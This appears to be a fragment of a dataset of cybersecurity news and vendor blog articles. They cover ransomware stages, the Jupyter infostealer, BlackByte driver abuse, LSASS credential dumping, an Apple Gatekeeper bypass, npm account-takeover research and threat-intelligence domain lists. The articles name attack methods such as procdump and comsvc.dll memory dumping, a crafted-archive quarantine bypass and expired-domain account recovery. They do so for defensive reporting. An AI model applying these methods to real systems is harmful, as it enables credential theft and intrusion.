and response comes in.” Stages of a Ransomware Attack In the webcast, Williams and Chapman list eight distinct stages in a typical ransomware attack: Initial access – how it's usually accomplished, and why detecting attacker backdoors is so difficult Command and control – and the keys to detection Local privilege escalation – and why it’s so easy for threat actors to carry out Lateral movement – and corresponding detection methods Domain privilege escalation – the top four tactics typically favored by attackers Data exfiltration – threat actors exfiltrate data prior to encryption Searching for your backups – and the lengths malicious actors will go to in order to find them Deployment of the ransomware – and the most common tools attackers use View the webcast , or read the free white paper for more details on each attack stage, and to understand opportunities to disrupt a ransomware attack as it occurs in your environment.

After activation, this threat receives executables and malicious PowerShell scripts from its command-and-control (C2) server, including an infostealing module which swipes the user’s log-on credentials, administrative rights, workgroup and browser password databases. Jupyter can also grab cookies from common browsers such as Google Chrome™, Microsoft Edge®, Opera, Brave, and Mozilla Firefox, along with login information and “autofill” data such as the user’s name, physical address, and email. Like many other information stealers, Jupyter also targets crypto wallets, as well as virtual private networks (VPNs) and remote access software. In the past, Jupyter has gone by many names, including SolarMarker / Deimos , Polazert , and Yellow Cockatoo . Malware authors have continued improving its stealth features. For example, Jupyter is often wrapped with .MSIs, which are large Windows® installer packages. Commonly, these packages are signed with legitimate digital certificates. While the packages’ legitimate files run, Jupyter executes malicious actions in the background through a small, well-hidden PowerShell script. The developers of this infostealer do not appear to target specific organizations and seem to lack a fixed agenda. They instead tend to target any user who might fall into Jupyter's deceptive trap which makes it a widespread threat.

Video Transcript In this video we are going to analyze Jupyter, an infostealer – considered a master of deception – that hides deep within legitimate installer packages. We configured our machine with CylanceOPTICS ® in “audit only” mode to allow Jupyter's execution. In this case, the file appears to be an installer of a legitimate known PDF reader that is more than 100 megabytes in size and does not trigger any alert on the system. It is a signed document with a valid certificate. However, deep within the code resides a relatively small, heavily obfuscated and encrypted PowerShell script that will run in the background. It looks just like a legitimate application, and it goes with the actual installation process. Upon infection, it applies persistence on the registry and adds itself to the startup applications. Afterward, the attacker can deploy modules to steal user credentials and information across well-known internet browsers and crypto wallets. To better understand what happens in the background, we can look at our root cause analysis on this file, where we can see all the network communication that has happened to download the necessary malicious files. We can also see the steps taken by this malware on our ‘detections’ tab with all the alerts that have been triggered from a process without common executable extensions, as well as what Jupyter has done in the registry to secure its persistence. For additional analysis, we can get more details about this file by identifying its properties, the certificate that has been used to sign the file, how many endpoints it has been detected on, as well as an extensive list of malicious threat indicators. These include the files’ anomalies, collection capabilities, deception, and destruction indicators. When it comes to preventing these types of threats, CylancePROTECT ® provides multiple layers of AI-based prevention to stop the PowerShell script, with script control to intercept its attempt to load the malicious DLL into memory, memory protection, and convicting the file with our machine learning model.

""The evasion technique supports disabling a whopping list of over 1,000 drivers on which security products rely to provide protection,"" Sophos threat researcher Andreas Klopsch said in a new technical write-up. BYOVD is an attack technique that involves threat actors abusing vulnerabilities in legitimate, signed drivers to achieve successful kernel-mode exploitation and seize control of compromised machines. Weaknesses in signed drivers have been increasingly co-opted by nation-state threat groups in recent years, including Slingshot , InvisiMole , APT28 , and most recently, the Lazarus Group . BlackByte, believed to be an offshoot of the now-discontinued Conti group , is part of the big game cybercrime crews, which zeroes in on large, high-profile targets as part of its ransomware-as-a-service (RaaS) scheme. According to the cybersecurity firm, recent attacks mounted by the group have taken advantage of a privilege escalation and code execution flaw ( CVE-2019-16098 , CVSS score: 7.8) affecting the Micro-Star MSI Afterburner RTCore64.sys driver to disable security products. What's more, an analysis of the ransomware sample has uncovered multiple similarities between the EDR bypass implementation and that of a C-based open source tool called EDRSandblast , which is designed to abuse vulnerable signed drivers to evade detection. BlackByte is the latest ransomware family to embrace the BYOVD method to achieve its goals, after RobbinHood and AvosLocker , both of which have weaponized bugs in gdrv.sys ( CVE-2018-19320 ) and asWarPot.sys to terminate processes associated with endpoint protection software.

Shortly after establishing its business, however, it gained notoriety for hosting the sites owned by spammers, malware operators, distributed denial-of-service (DDoS) attackers, and other cybercriminals. Throughout its operation, RBN’s claims to fame include being tagged “ the baddest of the bad ” by VeriSign. Spamhaus, meanwhile, named it “among the world’s worst spam, malware, phishing, and cybercrime hosting networks,” thus including several of its IP addresses in its blocklist. While RBN has seemingly gone quiet for some time, our threat researchers are wondering if it has shut down. Our in-depth look into what’s left of the RBN infrastructure revealed: A sample of the additional artifacts obtained from our analysis is available for download from our website . Over the years, the cybersecurity community has collated IoCs related to RBN, including these 26 domains: We used these web properties as jump-off points for our investigation. A closer look at the domains’ historical WHOIS records allowed us to uncover 21 unredacted email addresses used to register the IoCs. DNS lookups for the IoCs led to the discovery of 45 IP addresses to which they resolved. These were spread across eight countries topped by the U.S., Germany, China, and the British Virgin Islands. We then expanded the list of IoCs with possibly connected artifacts, specifically domains, that shared their registrant email addresses or IP hosts. Consistent with the IP geolocation data, according to a bulk WHOIS lookup , most of the possibly connected domains were registered in the U.S., followed by the Czech Republic, China, and Germany. The rest were scattered across 10 other countries—Japan, Russia, Canada, Iceland, Taiwan, Thailand, Mexico, Panama, Turkey, and the U.A.E. The bulk WHOIS lookup also showed that a majority of the additional domains were created between 2015 and 2022. Reverse WHOIS searches and reverse IP lookups uncovered 399 domains that could have ties to the RBN infrastructure. A bulk malware check on the Threat Intelligence Platform (TIP) showed that organizations should block access to four of them—ilo[.]brenz[.]pl, ant[.]trenz[.]pl, www[.]ipshougou[.]com, and www[.]52cps[.]com. Organizations that wish to steer clear of the dangers that RBN-hosted web properties pose can block access to the malicious domains identified in this post, apart from those already identified as IoCs. Monitoring for malicious activities related to the IP addresses that host the IoCs would also be helpful. Keeping a keen eye on domains containing the names of anti-malware programs or any software that don’t look legitimate is also advised. Finally, including web properties connected to the identified registrant email addresses in threat monitoring efforts could also be worth doing.

Apache has two other CVEs on the list: CVE-2022-24112 (an authentication bypass), and CVE-2021-41773 (a path traversal bug in the HTTP server). Microsoft made the list four times, with remote code execution (RCE) bugs in Exchange ( CVE-2021-26855 , CVE-2021-26857 , CVE-2021-26858 , and CVE-2021-27065 ).

According to the developers’ notification , the bug affects “Dex instances with public clients (and by extension, clients accepting tokens issued by those Dex instances)”. If an attacker takes a victim to a malicious website and guides them through the OIDC flow, they can steal the OAuth authorisation code, and exchanging this for a token gives the attacker access to applications that accept that token. The bug exists because the authentication process creates a persistent “connector state parameter” as the request ID to look up the OAuth code. “Once the user has successfully authenticated, if the webserver is able to call /approval before the victim’s browser calls /approval, then an attacker can fetch the Dex OAuth code which can be exchanged for an ID token using the /token endpoint,” the advisory stated.

The underlying message behind CSAM is the need to be cyber-vigilant and to educate the recipient on the dangers lurking in cyberspace. It’s an incredibly important message. But I suspect that some of you, like me, may be fatigued at receiving what appear to be the same messages year after year. In fact, if you look back 10 years at the CSAM campaigns on StopThinkConnect.org , a joint government and industry initiative, you will notice they are close to identical to the 2022 campaign messages – use strong and unique passwords , check links before clicking … These are all are great messages and wise advice, both then and today (and I am positive they have an effect), but it’s clear that the issue is not being resolved, and so I can’t help asking: Should we be looking to move the message to a ‘place’ that makes it an automatic human reaction? Hidden dangers, such as those on the internet, are often difficult to appreciate without some form of visualization. Take, for example, road safety: if there was no visualization – cars whizzing past you when you want to cross the road or no car wrecks left on the side of the road – then it could be challenging to teach someone road safety as a pedestrian or a driver. Even when the danger is visual, shock tactics are often needed to reinforce the message and make sure it’s understood and heard. An example, sticking to the road safety topic, is the UK’s internationally recognized THINK! campaign, and to a certain degree even the 1975 Green Cross Code campaign. The THINK! campaign produced notable results in reducing issues related to drink driving, young driver safety and such like. How? By using shocking visualizations of the consequences; for example, a body through a windscreen due to the lack of seatbelt wearing. The type of cyber-incidents that CSAM typically focuses on lack visual consequences by nature. Yet, the effects of suffering a cyber-incident can be devastating, especially on a personal level, and there is likely to be one consistent issue: a degradation in the mental health of the victim. Whether the issue is trolling , cyberbullying , fraud , identity theft , grooming , credential theft , or one of the many other variants of cyberthreats, there are likely to be consequences – mental health consequences that are hidden from visual identification. For example, many victims of romance scams are extremely embarrassed to admit they’ve been duped. Yet in reality, talking to friends and family could be valuable on the path to dealing with the issue and recovering. A similar feeling may apply when someone clicks a phishing link and gives away their login credentials or personal information – there is likely to be a feeling of ‘how stupid was I!’. Safety as a default mindset, such as road safety, comes by instilling the consequences and understanding the dangers from a very early age, using guidance that is repetitive and comes from multiple sources. Imagine the scenario where, by default, no one clicks a link in an email without hovering over it and visually inspecting the address, or the scenario where just a password is unacceptable and stronger authentication is always sought out and turned on. To achieve this level of instinctive protection, the habit would need to be taught and continually reinforced at an early age – in the same way a parent, and a wider circle of people, teach a child to cross the road. FURTHER READING: A generation of connected kids The technology revolution that my generation, Generation X, has encountered has been life changing in nearly every aspect of living. We have seen the introduction of technology that has truly changed the way we communicate, behave, work, etc. Importantly, we have seen technology mature with safety and security mechanisms being added, and an evolution of cybersecurity – and unfortunately, also an evolution of cyberthreats. As a generation, we could never have been taught certain elements of online safety by default, as the issue did not exist. However, this does not mean we should not educate the next generation to have the core default instincts and skills. Run a Google search for ‘kids online safety’ and you will be awash with boundless amounts of content that discusses cyberbullying, inappropriate content, self-harm, identity theft , and many more important topics. Now search for the number one cyberthreat – it’s phishing, with stats claiming that 90% of cyber-incidents start with a phishing attack . As someone who talks about cybersecurity to many businesses, I can confirm with high confidence that this is the number one issue for companies in regard to cybersecurity. If any of you have been mandated to take cybersecurity awareness training , then you will know a large section of this revolves around the identification of a phishing email and how to spot fraudulent links and avoid clicking on them. If we want to solve the number one cybersecurity issue for businesses, then we need to have a generation on its path to the workplace that have a default mechanism instilled in them that stops them from just clicking on a link or handing over their credentials. A reaction where they immediately understand the danger, have a visualization of it, and take a safe approach. To achieve this dream where phishing no longer exists, with no one ever being duped, would require a sea change in the use of technology at an early age, and in how we guide kids and what they are taught as a core fundamental skill.",['Cybersecurity'],791b328f-9128-574c-b0b8-dca965693e27,"October is Cybersecurity Awareness Month (CSAM), and with it the annual deluge of articles about phishing, passwords, protecting personal data and such like that will be hitting your inboxes very soon (if they have not already landed).

The vulnerability, tracked as CVE-2022-32910 , is rooted in the built-in Archive Utility and ""could lead to the execution of an unsigned and unnotarized application without displaying security prompts to the user, by using a specially crafted archive,"" Apple device management firm Jamf said in an analysis. Following responsible disclosure on May 31, 2022, Apple addressed the issue as part of macOS Big Sur 11.6.8 and Monterey 12.5 released on July 20, 2022. The tech giant, for its part, also revised the earlier-issued advisories as of October 4 to add an entry for the flaw. Apple described the bug as a logic issue that could allow an archive file to get around Gatekeeper checks, which is designed so as to ascertain that only trusted software runs on the operating system. The security technology achieves this by verifying that the downloaded package is from a legitimate developer and has been notarized by Apple – i.e., given a stamp of approval to ensure it's not been maliciously tampered with. ""Gatekeeper also requests user approval before opening downloaded software for the first time to make sure the user hasn't been tricked into running executable code they believed to simply be a data file,"" Apple notes in its support documentation. It's also worth noting archive files downloaded from the internet are tagged with the ""com.apple.quarantine"" extended attribute, including the items within the file, so as to trigger a Gatekeeper check prior to execution. But in a peculiar quirk discovered by Jamf, it was found that the Archive Utility fails to add the quarantine attribute to a folder ""when extracting an archive containing two or more files or folders in its root directory."" Thus by creating an archive file with the extension ""exploit.app.zip,"" it leads to a scenario where an unarchival results in the creation of a folder titled ""exploit.app,"" while also lacking the quarantine attribute. This application ""will bypass all Gatekeeper checks allowing an unnotarized and/or unsigned binary to execute,"" Jamf researcher Ferdous Saljooki, who discovered the flaw, said. Apple said it resolved the vulnerability with improved checks. The findings come more than six months after Apple addressed another similar flaw in macOS Catalina, Big Sur 11.6.5, and Monterey 12.3 ( CVE-2022-22616 ) that could allow a malicious ZIP archive to bypass Gatekeeper checks.",['Malware'],9b0ace43-65f5-5773-b3d8-89a39474df0f,"A now-addressed security flaw in Apple macOS could be potentially exploited to run malicious applications in a manner that can bypass Apple’s security measures. “Gatekeeper also requests user approval before opening downloaded software for the first time to make sure the user hasn’t been tricked into running executable code they believed to simply be a data file,"" Apple notes in its support documentation."

One technique attackers use is targeting credentials in the Windows Local Security Authority Subsystem Service (LSASS) process memory because it can store not only a current user’s OS credentials but also a domain admin’s. LSASS credential dumping was first observed in the tactics, techniques, and procedures (TTPs) of several sophisticated threat activity groups—including actors that Microsoft tracks as HAFNIUM and GALLIUM — and has become prevalent even in the cybercrime space, especially with the rise of the ransomware as a service gig economy . Detecting and stopping OS credential theft is therefore important because it can spell the difference between compromising or encrypting one device versus an entire network. Security solutions must provide specific measures and capabilities to help harden the LSASS process—for example, Microsoft Defender for Endpoint has advanced detections and a dedicated attack surface reduction rule (ASR) to block credential stealing from LSASS. In May 2022, Microsoft participated in an evaluation conducted by independent testing organization AV-Comparatives specifically on detecting and blocking the LSASS credential dumping technique. The test, which evaluated several endpoint protection platforms (EPP) and endpoint detection and response (EDR) vendors, is the first time AV-Comparatives focused on a single attack technique, and we’re happy to report that Defender for Endpoint passed all 15 test cases used to dump user OS credentials from the LSASS process, achieving 100% detection and prevention scores. Notably, we also passed all test cases with only Defender for Endpoint’s default settings configured , that is, with LSASS ASR and Protective Process Light (PPL) turned off to validate our antivirus protection durability in itself. Such results demonstrate our continued commitment to provide organizations with industry-leading defense. In this blog, we share examples of various threat actors that we’ve recently observed using the LSASS credential dumping technique. We also provide details on the testing methodology done by AV-Comparatives, which they also shared in their blog and detailed report . Finally, we offer additional recommendations to further harden systems and prevent attackers from taking advantage of possible misconfigurations should they fail to leverage credential dumping. LSASS credential dumping: What we see in the wild Dumping LSASS credentials is important for attackers because if they successfully dump domain passwords, they can, for example, then use legitimate tools such as PsExec or Windows Management Instrumentation (WMI) to move laterally across the network. They can also use techniques like pass-the-hash for lateral movement if they manage to obtain the password hashes. Microsoft researchers are constantly monitoring the threat landscape, including the different ways threat actors attempt to steal user credentials. The table below is a snapshot of the most popular credential theft techniques these actors used from March to August 2022 based on our threat data: Living-off-the-land binary (LOLBin) or hacking tool Threat actor that frequently uses this (not exhaustive) Comsvc.dll (and its “MiniDump” export) loaded by rundll32.exe DEV-0270 Mimikatz (and its modified variants) DEV-0674 Procdump.exe (with -ma command line option) DEV-0555 Taskmgr.exe DEV-0300 The first column shows the technique attackers most frequently used in their attempt to dump credentials from LSASS, while the second column shows which threat actor uses this technique most frequently. Based on the incidents we tracked from March to August 2022, credential theft attacks using LOLBins such as comsvc.dll , procdump.exe , or taskmgr.exe are still popular. These LOLBins are legitimate, digitally signed binaries that are either already present on the target device or are downloaded onto the system for the attacker to misuse for malicious activities. Microsoft Defender Antivirus prevents the execution of these command lines due to its synchronous command line-blocking capabilities. AV-Comparatives test To evaluate EPP and EDR capabilities against the LSASS credential dumping technique, AV-Comparatives ran 15 different test cases to dump credentials from the LSASS process using both publicly available hacking tools like Mimikatz (which the tester modified to bypass antivirus signatures) and privately developed ones. These test cases were as follows: Test case LSASS attack method 01 Mimikatz with process herpaderping 02 Native APIs DLL 03 Silent process exit 04 Alternative API snapshot function 05 MalSecLogon 06 Dump LSASS 07 Duplicate dump 08 PowerShell Mimikatz 09 Invoke Mimikatz (PoshC2) 10 SafetyDump 11 RunPE snapshot (PoshC2) 12 Unhook (Metasploit framework) 13 Reflective DLL (Metasploit framework) 14 Invoke Mimikatz (PowerShell Empire) 15 Invoke-PPL dump (PowerShell Empire) Each test case implemented a comprehensive approach on how to dump credentials from LSASS. After the evaluation, AV-Comparatives shared the logs and detailed description of the test cases. Microsoft participated using Defender for Endpoint, both its antivirus and EDR capabilities, with only the default settings configured . During the initial run, Defender for Endpoint prevented 11 out of 15 test cases and alerted/detected three of the remaining ones (Figure 1). We then made improvements in our protection and detection capabilities and asked AV-Comparatives to re-test the missed test cases. During the re-test, we prevented all the remaining four test cases, achieving 15 out of 15 prevention score. Figure 1. Table showing how Defender for Endpoint prevented/detected the test cases in the first run of the AV-Comparatives test. The antivirus module missed test cases 01, 03, 09, and 10. We added improvements to the product based on these findings, thus allowing Defender for Endpoint to achieve 100% prevention score on re-test. (Source: AV-Comparatives ) We’d like to thank AV-Comparatives for this thorough test, which led us to improve our protection and detection capabilities in Defender for Endpoint. These improvements have already been rolled out to benefit our customers, and we’re looking forward to the next similar test. We aim to provide industry-leading, cross-domain defense, so it’s important for us to participate in tests like AV-Comparatives and MITRE Engenuity ATT&CK Evaluations because they help us ensure that we’re delivering solutions that empower organizations to defend their environments. Securing the LSASS process with coordinated threat defense and system hardening The continuous evolution of the threat landscape has seen attacks leveraging OS credential theft, and threat actors will continue to find new ways to dump LSASS credentials in their attempts to evade detection. For Microsoft, our industry-leading defense capabilities in Microsoft Defender for Endpoint are able to detect such attempts. We’ve also introduced new security features in Windows 11 to harden the operating system, such as enabling PPL for the LSASS process and Credential Guard by default. However, evaluations like this AV-Comparatives test go hand in hand with threat monitoring and research because they provide security vendors additional insights and opportunities to continuously improve capabilities. Our teams performed an in-house test of all these test cases with the LSASS ASR rule enabled to check the protection level of that rule. We’re happy to report that the ASR rule alone successfully prevented all the tested techniques. The LSASS ASR rule is a generic yet effective protection our customers can implement to stop currently known user-mode LSASS credential dumping attacks. Defender customers should therefore enable this ASR rule—along with tamper protection —as an added protection layer for the LSASS process. On top of the various dumping techniques, we’ve also observed threat actors attempt to weaken the device settings in case they can’t dump credentials. For example, they attempt to enable “UseLogonCredential” in WDigest registry, which enables plaintext passwords in memory. Microsoft Defender Antivirus detects such techniques, too, as Behavior:Win32/WDigestNegMod.B. Windows administrators can also perform the following to further harden the LSASS process on their devices: Enable PPL for LSASS process ; note that for new, enterprise-joined Windows 11 installs (22H2 update), this is already enabled by default Enable Windows Defender Credential Guard ; this is also now enabled by default for organizations using the Enterprise edition of Windows 11 Enable restricted admin mode for Remote Desktop Protocol (RDP) Disable “UseLogonCredential” in WDigest Finally, customers with Azure Active Directory (Azure AD) can follow our recommendations on hardening environments: Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself – Microsoft Security Blog Best Practices for Securing Active Directory | Microsoft Learn Pass the Hash | Microsoft Learn",['Cybersecurity'],1086759c-e663-5d52-aa39-8e14f2ca6619," Dumping LSASS credentials is important for attackers because it can allow them to steal not only a current user’s OS credentials, but also a domain admin ’s.

Nobody.,John Chen,2022-10-05,"As BlackBerry’s CEO, my days are filled with lots of conversations, and lots of questions. One of my favorites is about our unified endpoint management, or UEM: What is it, and why do I think it’s the best and most secure on the market? I have two answers: One is simple, and the other is more complicated. Scroll down if you just want the simple answer, because I’m going to start with the “complicated” one. First off, UEM is a fancy term for something you probably already have running in your technology stack. For mobile devices, it typically combines two important functions: MDM (mobile device management) and MAM (mobile application management). It’s what protects the full range of mobile and personal devices in your environment — mobile phones, tablets, and even Chromebook™ and other devices that don’t run a typical desktop operating system, like Windows® or macOS®. If your UEM doesn’t protect all those devices, regardless of their operating systems, that’s the first clue that your UEM solution may have some gaps. Having a robust, end-to-end UEM solution is incredibly important these days because of how much our organizations have pivoted to relying on remote workers — and the BYOD and personal devices they now use on our behalf. Securing those devices has become as important as any security initiative or directive at your company today. Why? Because a chain is only as strong as its weakest link, and these personal mobile devices often represent the weakest link in an organization’s security portfolio. So here are a few reasons why I believe our UEM is superior. These points aren’t really “complicated,” but they are specific. They are technical differentiators, and each addresses critical gaps that exist in other MDM, MAM and UEM solutions — gaps that create risk for your operations, and that our BlackBerry® UEM uniquely eliminates: Data encryption: If your UEM solution relies on the underlying OS for encryption, you may be encrypting your data only when the device is “locked.” What about when the mobile device is in use and not locked? We recommend a UEM solution that provides local, on-device encryption for all data — locked or unlocked, at rest or in transit. Connectivity to data, apps and resources: If your UEM solution relies on a VPN to provide remote access to internal resources, and to connect to SaaS applications that reside “outside the firewall,” you may be limiting what your workers can accomplish with their devices. We recommend a solution that provides you with maximum control over which assets workers can access, without reliance on a VPN. The best solutions, in my opinion, are designed to reduce the “attack surface” of your devices. This can be accomplished by replacing outdated VPN connections with a secure IP tunnel that allows tighter access controls, and by eliminating open inbound ports to your environment. Flexible deployment: We recommend a UEM solution that supports a wide range of deployment scenarios, like BYOD implementations that involve secure containers on personal mobile devices, and enterprise activations with use cases that require secure access to “behind the firewall” resources. Support for a robust multi-vendor ecosystem: We recommend a UEM solution that focuses on the mission-critical applications that matter most to your business. Yes, access to productivity apps in your office suite must be seamless and secure, but that’s not enough. Your UEM solution should support the highest levels of security across an expanded ecosystem of trusted applications — including legacy apps that may have been developed in-house. Those are some specific reasons why I can confidently say, I think our UEM is the best in the market. But I also promised you a simple reason, so here it is: Because we’re BlackBerry. We invented secure mobile communications, and we have spent decades improving and perfecting it. You’d be hard-pressed to find another company that has invested more time and R&D dollars into securing and hardening mobile devices, to make them as safe and workplace-ready as possible. So whatever you are currently running to protect your mobile endpoints, we can improve it. I rest my case.

Evidence gathered by the mobile security company shows that the malicious app is distributed through links on social media and communication tools like Telegram, tricking unsuspecting users into sideloading the app and granting it extensive permissions. The idea behind embedding the malware within a fake VPN and phone number spoofing service is also clever in that the app claims to enable users to verify social media accounts via phone, a technique popular in countries where access is restricted. ""Once installed and in control, the attackers could access the camera to take pictures, record video and audio, get precise GPS locations, view pictures from the device, and more,"" Zimperium researcher Nipun Gupta said. Other features of RatMilad, which is spread through apps named Text Me and NumRent, make it possible for the malware to amass SIM information, clipboard data, SMS messages, call logs, contact lists, and even perform file read and write operations. Zimperium hypothesized that the operators responsible for RatMilad acquired source code from an Iranian hacker group dubbed AppMilad and integrated it into a fraudulent app for distributing it to unwitting users. The scale of the infections is unknown, but the cybersecurity company said it detected the spyware during a failed compromise attempt of a customer's enterprise device. A post shared on a Telegram channel used to propagate the malware sample has been viewed over 4,700 times with more than 200 external shares, indicating a limited scope. ""The RatMilad spyware and the Iranian-based hacker group AppMilad represent a changing environment impacting mobile device security,"" Richard Melick, director of mobile threat intelligence at Zimperium, said.

It appears that some malware operators also took this time as an opportunity to possibly rest, refocus, and reanalyze their current procedures and activities. According to our telemetry, August was a vacation month for the operators of Emotet , the most influential downloader strain. The gang behind it also adapted to Microsoft’s decision to disable VBA macros in documents originating from the internet and focused on campaigns based on weaponized Microsoft Office files and LNK files. In T2 2022, we saw the continuation of the sharp decline of Remote Desktop Protocol (RDP) attacks, which likely continued to lose their steam due to the Russia-Ukraine war, along with the post-COVID return to offices and overall improved security of corporate environments. Even with declining numbers, Russian IP addresses continued to be responsible for the largest portion of RDP attacks. In T1 2022, Russia was also the country that was most targeted by ransomware, with some of the attacks being politically or ideologically motivated by the war. However, as you will read in the ESET Threat Report T2 2022, this hacktivism wave has declined in T2, and ransomware operators turned their attention towards the United States, China, and Israel. In terms of threats mostly impacting home users, we saw a sixfold increase in detections of shipping-themed phishing lures, most of the time presenting the victims with fake DHL and USPS requests to verify shipping addresses. A web skimmer known as Magecart, which saw a threefold increase in T1 2022, continued to be the leading threat going after online shoppers’ credit card details. The plummeting cryptocurrency exchange rates also affected online threats – criminals turned to stealing cryptocurrencies instead of mining them, as seen in a twofold increase in cryptocurrency-themed phishing lures and rising numbers of cryptostealers. The past four months were also interesting in research terms. Our researchers uncovered a previously unknown macOS backdoor and later attributed it to ScarCruft, discovered an updated version of the Sandworm APT group’s ArguePatch malware loader , uncovered Lazarus payloads in trojanized apps , and analyzed an instance of the Lazarus Operation In(ter)ception campaign targeting macOS devices while spearphishing in crypto-waters. They also discovered buffer overflow vulnerabilities in Lenovo UEFI firmware and a new campaign using a fake Salesforce update as a lure. During the past few months, we have continued to share our knowledge at the Virus Bulletin, Black Hat USA, RSA, CODE BLUE, SecTor, REcon, LABSCon, and BSides Montreal cybersecurity conferences, where we disclosed our findings about campaigns deployed by OilRig, APT35, Agrius, Sandworm, Lazarus, and POLONIUM. We also talked about the future of UEFI threats, dissected the unique loader we named Wslink, and explained how ESET Research does attribution of malicious threats and campaigns.

The email addresses led us to more than 4,400 domain names, any of which can be weaponized and used in phishing, credential theft, and other forms of cyber attacks. We studied the domain portfolio in light of our DNS, WHOIS, and IP intelligence and uncovered the following: A sample of the additional artifacts obtained from our analysis is available for download from our website . Nearly a third of the domains were registered with GoDaddy and Network Solutions. The other top registrars were Namecheap, PDR Ltd., CSL Computer, TurnCommerce, Maff, Domain International Services, and Gname. On the other hand, the IP addresses of the resolving domains were mostly assigned to Amazon, Softqloud, Cloudflare, Google, Gransys, Hetzner, Squarespace, Peg Tech, Confluence, and Unified Layer. We performed a lexical analysis of the domains possibly connected to the Iran-based hackers. Some of the most common text strings and examples of domains bearing them were: These and other recurring words can be seen in the image below. The hackers’ domain portfolio mostly fell under the .com space, but other TLDs were used, including .ir, .net, .org, .biz, and .us. With the help of Bulk IP Geolocation and Bulk WHOIS Lookup , we determined that the U.S. was the domain portfolio’s top location in terms of IP resolution and domain registration. That can be seen in the side-by-side comparison below. The other countries that appeared on both charts include Canada and China. Aside from parked domains and gambling and adult sites, other contents hosted on the domains were mostly news- and e-commerce-related. We also found interesting content that appeared on two domains that displayed a PayPal donation page. Other suspicious website screenshots include those that were made to appear like Discuz and WordPress. Aside from scrutinizing the domains uncovered by our threat researcher, we also endeavored to find more possible domain connections. That was done by looking at the historical WHOIS records of the domains that were reported as malicious. One malicious domain, salarserver[.]ir, was tied to four unredacted email addresses all throughout its registration history. Performing a reverse WHOIS search on the emails, we discovered 981 additional domains that were not on the initial list of domains. They were also mostly under the .ir (82%) and .com (13%) TLD spaces. Ten of the additional domains were flagged as malicious, with some looking quite similar to the malicious domains on our initial list—absher-sa-sa[.]com and salarserver[.]ir. Digging deeper, we used Reverse WHOIS Search again to uncover .com domains containing the text string “absher,” and .ir domains containing “salar.” That led us to 1,162 additional digital properties, about 12% of which were flagged as malicious. We uncovered the domain portfolio of a group of hackers by running DNS and WHOIS analyses on email addresses tied to them. These connections were further expanded by digging into the historical WHOIS records of the malicious domains and looking for string-related associations. While some may have coincidental connections, the majority can be treated as suspicious and may help the cybersecurity community formulate an effective early warning system.

Over the past several years, high-profile software supply chain attacks have increased in frequency. These attacks can be difficult to detect and source code repositories became a key focus of this research. Developer account takeovers present a substantial risk to the software supply chain because attackers who successfully compromise a developer account could conceal malicious code in software packages used by others. Talos analyzed several of the major software repositories to assess the level of developer account security, focusing specifically on whether developer accounts could be recovered by re-registering expired domain names and triggering password resets. Many software repositories have already begun taking steps to enhance the security of developer accounts. Talos has identified additional areas where the security of developer accounts could be improved. Talos worked with vulnerable repositories to resolve issues that we found. Software supply chain attacks, once the exclusive province of sophisticated state-sponsored attackers , have been gaining popularity recently among a broader range of cyber criminals. Attackers everywhere have realized that software supply chain attacks can be very effective, and can result in a large number of compromised victims. Software supply chain attacks more than tripled in 2021 when compared with 2020. Why are software supply chain attacks so effective? Organizations that possess solid cyber defenses may be difficult to attack directly. However, these same organizations are likely vulnerable to a software supply chain attack because they still regularly run/build software obtained from vendors who are trusted. Rather than attacking an entire software repository itself, or identifying an unpatched vulnerability in a software package, compromising the software supply chain can be as simple as attacking the accounts of the package developers and maintainers. Most software repositories track the identities of their software developers using those developers' email addresses. If a cybercriminal somehow gains access to a developer's email account, the attacker can theoretically generate password reset emails at these software repositories and take over the account belonging to that developer. Once inside, an attacker could then publish malicious updates to the code maintained by that developer, affecting every other piece of software that uses that library from then on. Cisco Talos examined several frequently used code repositories. We looked specifically at the security afforded to developer accounts, and how difficult it would be for an attacker to take over a developer account. While some repositories had stringent security in place, others did not. Fortunately, worked with the managers of these repositories to resolve the major issues we found. Risks in the software supply chain Re-inventing the wheel is typically not a good idea. This holds true for many things, including developing software. Much software written today depends on third-party packages and software libraries to facilitate necessary functionality contained in the program. Utilizing third-party libraries and packages, especially open source, also speeds up development and lowers costs. Popular software packages have also become attractive targets for attackers. The more popular a software library is, the more external software will be using that library, and thus, the larger the potential attack surface. Compromising a software library can potentially compromise every other piece of software that relies on that software library for its functionality. This is the risk inherent in the software supply chain. With the exception of language-agnostic repositories like GitHub , most software repositories tend to be language specific. For example, JavaScript authors rely mostly on NPM , Python developers have PyPI , Perl programmers can often be found using packages obtained via CPAN , and so on. Each software repository sets its own rules when it comes to developers' accounts. Additionally, as many programmers are aware, some programming languages make a better choice for solving certain types of problems. For example, embedded systems drivers are more commonly written in C instead of Perl, while parsing text is more commonly done in Perl or Python, rather than C. This means that the process of writing programs that integrate third-party libraries into the code will also be different for each language. It is difficult to imagine a developer integrating a third-party library into a system-level driver written in C without carefully reviewing the related code and testing it for speed and functionality. However, when developing a feature-rich Perl proof-of-concept application or a web-based JavaScript application, this might not always be the case. A programmer in those instances might conceivably import a package first and ask questions later. This means some software repositories will carry more risk than others when it comes to malware hiding in the source code. NPM Node Package Manager is a JavaScript software repository and has been the subject of some ""independent"" security audits recently. There has been a lot of discussion online, especially concerning the security of the developer accounts there, and how easy it is to take over these accounts by re-registering expired email domains. There are more than 2 million packages in the NPM repository. Conveniently, an NPM package called ""all-the-package-names"" contains a list of all packages in the NPM repository. Each individual package at NPM has associated metadata, such as a text description of the package, a link to the package tarball, and a list of the package maintainers. Most importantly, the list of package maintainers has the developer's username and email address. Iterating through all the package names, and extracting the email addresses, then further extracting the domain names from those email addresses, provides the raw data necessary to find developer accounts associated with expired domains. Once an expired domain is found, it can be re-registered and theoretically used to take over the NPM developer account. But does it work this way in practice? Although we found a couple thousand expired developer account domain names, we could not recover the associated developer accounts. It appears the ""couple things in place to protect against [account takeover]"" that NPM administrator @MylesBorins mentioned in his tweet above are working as planned. Stale metadata helps foil attackers NPM provides developers with the ability to update the email address associated with their accounts. When a developer decides to switch email addresses, only the future package/version's metadata will contain the new email address. NPM does not retroactively update old metadata associated with a package that was previously published. This means that, even though someone looking to take over an NPM developer account might find package metadata indicating a developer with an expired email domain, it could simply be that the developer has updated their NPM account to a new email address. This was the case in May 2022, when a security researcher claimed to have taken over the NPM package ""foreach"" by re-registering the email domain belonging to the NPM developer. Unbeknownst to the security researcher, the developer in question had actually updated their NPM account to use their Gmail address instead. So if any password recovery attempts were made, they would have failed — NPM would have generated and sent the password reset emails to the new Gmail account on file, which is still under the original developer's control. PyPI PyPI is the Python Package Index and currently contains almost 